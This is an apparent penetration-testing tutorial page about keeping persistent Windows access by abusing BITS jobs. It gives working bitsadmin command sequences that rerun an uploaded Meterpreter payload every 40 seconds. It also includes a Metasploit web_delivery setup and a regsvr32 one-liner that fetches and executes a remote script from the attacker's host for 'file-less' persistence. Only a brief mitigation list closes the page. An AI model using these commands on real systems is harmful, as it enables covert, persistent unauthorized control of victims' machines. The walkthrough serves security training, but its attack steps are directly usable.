@@ -1,0 +1,98 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
+            <h1 class="post-title entry-title">Windows Persistence using Bits Job</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-persistence-using-bits-job/" rel="bookmark"><time class="entry-date published" datetime="2020-04-17T06:02:30+00:00">April 17, 2020</time><time class="updated" datetime="2025-05-12T13:41:04+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In this article, we are going to describe the ability of the Bits Job process to provide persistent access to the Target Machine.</span></p>
+<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
+<ul>
+<li><strong><span style="color: #000000;">Introduction</span></strong></li>
+<li><strong><span style="color: #000000;">Configurations used in Practical</span></strong></li>
+<li><strong><span style="color: #000000;">Manual Persistence</span></strong></li>
+<li><strong><span style="color: #000000;">Metasploit Persistence</span></strong></li>
+<li><strong><span style="color: #000000;">Metasploit (file-less) Persistence </span></strong></li>
+<li><strong><span style="color: #000000;">Mitigation</span></strong></li>
+</ul>
+<h3><span style="color: #800000;">Introduction</span></h3>
+<p><span style="color: #000000;">Background Intelligent Transfer Service Admin is a command-line tool that creates downloads or uploads jobs and monitors their progress. BITSAdmin was released with Windows XP. At that time, it used the IBackgroundCopyJob as its interface. The Upload option of the BITSAdmin was introduced with the release of Windows Server 2003. With the release of Windows Vista, we had some additional features like Custom HTTP headers, Certificate-based client authentication, and IPv6 support. The subsequent year was the release of Windows Server 2008, which introduced the File Transfer Notification Method. Windows 7 introduced the Branch Cache Method for the BITS Transfer. </span></p>
+<p><span style="color: #000000;">When BITS downloads a file, the svchost.exe service performs the actual download. BITSAdmin allows users to download files from or upload files to HTTP web servers and SMB file shares. It considers the cost of the transfer and the network usage, ensuring that the user’s foreground work is not influenced. BITS manages network interruptions, pauses, and automatically resumes transfers, even after a reboot.</span></p>
+<p><span style="color: #000000;">Read more about BITS Jobs form our dedicated article <a style="color: #000000;" href="https://www.hackingarticles.in/windows-for-pentester-bitsadmin/">here</a>.</span></p>
+<p><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></p>
+<p><span style="color: #000000;"><strong>Attacker:</strong></span></p>
+<p><span style="color: #000000;">    <strong>OS:</strong> Kali Linux 2020.1</span></p>
+<p><span style="color: #000000;">    <strong>IP:</strong> 192.168.1.112</span></p>
+<p><span style="color: #000000;"><strong>Target:</strong></span></p>
+<p><span style="color: #000000;">    <strong>OS:</strong> Windows 10</span></p>
+<p><span style="color: #000000;">    <strong>IP:</strong> 192.168.1.102</span></p>
+<h3><span style="color: #800000;">Manual Persistence</span></h3>
+<p><span style="color: #000000;">Let’s talk about manual persistence. In this scenario, we are going to assume the physical access of the target system as well as the meterpreter session on it. After gaining the meterpreter session, upload a payload to the target system which will get us the persistence session.  </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/raj.exe C:\</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S_4Vzq_Xaj4/XplEIYj5SoI/AAAAAAAAjlY/bP_PAr1aB2glinnts68nJi_kNzSpQxCdgCLcBGAsYHQ/s1600/0.png"/></span></p>
+<p><span style="color: #000000;">Now, we have the payload named “raj.exe”. We will configure a BITS Job to execute it at some intervals of time. Since we have the physical access of the system in this scenario, we will be using a command prompt for the following steps.</span></p>
+<h4><span style="color: #800000;">Creating and Configuring the BITS Job</span></h4>
+<p><span style="color: #000000;">First, we will be creating a job named payload. It can be anything we want. We will execute all these commands using BITSAdmin. It is the tool that handles all the BIT Jobs.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /create payload</pre>
+<p><span style="color: #000000;">Now, as the BITS Jobs were created to transfer or mostly download files from the Microsoft Servers or any other server for that matter. It needs to add a file into its configuration before it can move forward. Now this URL we provided was bogus. It can be anything as it has no role except fulfill the configuration requirements of BITSAdmin.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /addfile payload "https://www.hackingarticles.in/raj.exe"  "C:\raj.exe"</pre>
+<p><span style="color: #000000;">BITS Jobs can run a command upon the execution of its jobs. This was meant so that any prompt can be generated while downloading an update or some other task can be done simultaneously to the download. We will use this command to execute the payload that we uploaded earlier with the help of a meterpreter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /SetNotifyCmdLine payload C:\raj.exe NUL</pre>
+<h4><span style="color: #800000;">Executing and Maintaining Persistence</span></h4>
+<p><span style="color: #000000;">When a BITS download fails, it can retry to download after a specific duration of time. This can be set using SetMinRetryDelay Option. We will use this option to run our payload again and again so that in a case we lose the session, upon the next execution we can get the session again. We set it to 40 seconds here. Now, all we need is to initiate this job. It can be done using the resume option.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /SetMinRetryDelay "payload" 40
+bitsadmin /resume payload</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-p_t8jsxZqJE/XplEISG3JAI/AAAAAAAAjlg/y7g4dtnVIx4rhN4uov6bO5inalbwtxwgwCLcBGAsYHQ/s1600/1.png" alt="Windows Persistence using BITS Job" width="838" height="717"/></span></p>
+<p><span style="color: #000000;">We went back to our Kali Attacker Machine and we started a multi handler listener to grab the session that would be generated due to the BITS Job. We set it to the configuration that we used to create the raj.exe payload. In a moment, we see that another meterpreter session spawned. Now, if the configuration is correct, we will have sessions every 40 seconds.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6pe39s7L4lI/XplEIfRxO_I/AAAAAAAAjlc/ueq7ler2J8wB0ODNGfvJZlQkTFffCMYdQCLcBGAsYHQ/s1600/2.png"/></span></p>
+<h3><span style="color: #800000;">Metasploit Persistence</span></h3>
+<p><span style="color: #000000;">Next Scenario, it’s not too different than the previous scenario. All that changed is that we lost the physical access to the system. So we need to create the BITS Job remotely. The methods and command will remain the same just that after we uploaded the payload, we will run the shell command in meterpreter. Now all the commands that we ran to create the persistence previously we will run the same form here.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/raj.exe C:\
+shell
+bitsadmin /create payload
+bitsadmin /addfile payload "https://www.hackingarticles.in/raj.exe"  "C:\raj.exe"
+bitsadmin /SetNotifyCmdLine payload C:\raj.exe NUL
+bitsadmin /SetMinRetryDelay "payload" 40
+bitsadmin /resume payload</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-UGyWUIH84jI/XplEJUY1fVI/AAAAAAAAjlk/s4xBkfx19BY10ej597lywqkzJ6r1VztOACLcBGAsYHQ/s1600/3.png" alt="Windows Persistence using BITS Job" width="838" height="899"/></span></p>
+<p><span style="color: #000000;">And we started the multi-handler listener on the other terminal so that it can capture the session generated by the BITS Job that we just configured. Soon enough we have a new session.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qUPR1vXEm80/XplEJhWOpYI/AAAAAAAAjlo/qJYZIQReY8IT6xcsquDC9IIsBK7HPEDgQCLcBGAsYHQ/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">We performed this method to provide the insight that this kind of attack can be performed remotely without any physical access to the system.</span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Metasploit (file-less) Persistence</span> </span></h3>
+<p><span style="color: #000000;">In the previous methods, we created a payload and sent that to the Target Machine. That payload would create evidence of malicious activity. It can be located by the user or any Anti-Virus Software. So, we thought of creating a persistence without sending any file.</span></p>
+<p><span style="color: #000000;">Note: This method will still be able to detect from the BITS logs.</span></p>
+<p><span style="color: #000000;">We will use a malicious one-liner and run it with regsvr32. First, we must write the one-liner. For this task, we will use the multi/script/web_delivery. We configure the exploit by setting up the attacker machine’s IP address and port, where we will receive the session. We copy the generated script to our clipboard.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
+set target 3
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.1.112
+set lport 1234
+exploit
+regsvr32.exe "/s /n /u /i:http://192.168.1.112:8080/V1hTIQYe6Azh.sct scrobj.dll</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-xQPurH_DRO4/XplEJtpC2UI/AAAAAAAAjls/vsyeSfRKkIoxJtJfuWrDRbqGjlJ-ITj_wCLcBGAsYHQ/s1600/5.png" alt="Windows Persistence using BITS Job" width="746" height="314"/></span></p>
+<h4><span style="color: #800000;">Setting Up the BITS Job for Persistence</span></h4>
+<p><span style="color: #000000;">Now, we need the meterpreter session on the target systems as we had in the previous methods. We will be running the shell command on the Meterpreter. Now we need to create a job. We name it payload as before. Again, it can be anything we want. Then we have the bogus link that we added in the previous methods. Now it’s time to configure the command. Here we will configure the BITS Job to run the malicious one-liner we copied earlier. Then we will set the delay, and we are good to go.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+bitsadmin /create payload
+bitsadmin /addfile payload "https://www.hackingarticles.in/raj.exe"  "C:\raj.exe"
+bitsadmin /SetNotifyCmdLine payload regsvr32.exe "/s /n /u /i:http://192.168.1.112:8080/V1hTIQYe6Azh.sct scrobj.dll"
+bitsadmin /SetMinRetryDelay "payload" 40
+bitsadmin /resume payload</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VXuLjLIz2gY/XplEKH5kO3I/AAAAAAAAjlw/slT5SRJ7UjkEOgptI3GNMjaJlcUMiI6egCLcBGAsYHQ/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Back on the attacker machine, our web_delivery exploit creates a listener on its own. In some time, we have a session that is configured to be persistent.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-tmB5iUOzTBo/XplEKaR9pRI/AAAAAAAAjl0/ZjU6-ZACPWo7zZgPaG18cB0mit0gy1LTgCLcBGAsYHQ/s1600/7.png" alt="Windows Persistence using BITS Job" width="627" height="309"/></span></p>
+<p><span style="color: #000000;">This concludes the ability of BITS Job to provide persistence shells on the Windows Machines. Now let’s take a look at some useful mitigations against these kinds of attacks.</span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<p><span style="color: #000000;">Our recommendations for mitigating BITS Jobs are:</span></p>
+<ul>
+<li><span style="color: #000000;">Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic.</span></li>
+<li><span style="color: #000000;">Reduce the default BITS job lifetime in Group Policy or by editing the “JobInactivityTimeout” and “MaxDownloadTime” Registry values in HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS. You can modify the default maximum lifetime for a BITS job, which is 90 days.</span></li>
+<li><span style="color: #000000;">Limit the access of the BITSAdmin interface to specific users or groups.</span></li>
+</ul>
+<p><span style="color: #000000;">We at Hacking Articles want to request everyone to stay at home and self-quarantine yourself for the prevention against the spread of the COVID-19. I am writing this article while Working from home. Take care and be Healthy!</span></p>
+<p><span style="color: #000000;">To learn more about Windows Persistence. Follow this <strong><a href="https://www.hackingarticles.in/tag/windows-persistence/">Link.</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
